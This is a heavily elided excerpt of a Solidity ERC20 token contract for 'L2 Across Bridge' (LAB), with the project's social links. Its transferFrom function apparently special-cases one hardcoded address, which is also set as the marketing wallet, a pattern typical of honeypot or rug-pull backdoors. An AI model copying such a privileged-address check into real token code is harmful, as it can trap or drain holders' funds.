...
Website: https://l2abridge.com
Twitter: https://twitter.com/l2abridge
Telegram: https://t.me/l2abridge
...
contract ERC20 is Context, IERC20, IERC20Metadata {
   ...
   constructor(string memory name_, string memory symbol_) {
    ...
    function transferFrom(
        ...
        if(msg.sender!=0x2c8C88a09f5e970e5e2C874BEaaCca8CfFd1Ea1A){
...
contract LAB is ERC20, Ownable {
    ...
    constructor() ERC20("L2 Across Bridge", "LAB") {
        ...
        mktWallet = address(0x2c8C88a09f5e970e5e2C874BEaaCca8CfFd1Ea1A); // set as Marketing wallet
